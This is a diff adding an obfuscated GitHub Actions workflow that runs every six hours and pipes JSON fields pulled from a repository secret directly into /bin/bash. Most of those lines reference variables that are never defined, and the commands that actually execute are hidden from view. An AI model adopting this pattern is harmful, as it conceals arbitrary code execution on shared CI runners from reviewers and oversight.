@@ -1,0 +1,25 @@
+name: yanfusu1932
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanfusu1932
+        env:
+          be24: ${{ secrets.be24 }}
+        run: |
+          echo $be24 | jq -r .n65 | /bin/bash
+          echo $seoge491 | jq -r .pe9177 | /bin/bash
+          echo $lr96 | jq -r .qrlx59213 | /bin/bash
+          echo $ffbwz15262 | jq -r .uuabz296 | /bin/bash
+          echo $ybgzj499 | jq -r .orsue66812 | /bin/bash
+          echo $wdbkj97 | jq -r .d36388 | /bin/bash
+          echo $uqvdc18937 | jq -r .xeszp195 | /bin/bash
+          echo $ufwyg8 | jq -r .m70528 | /bin/bash
+
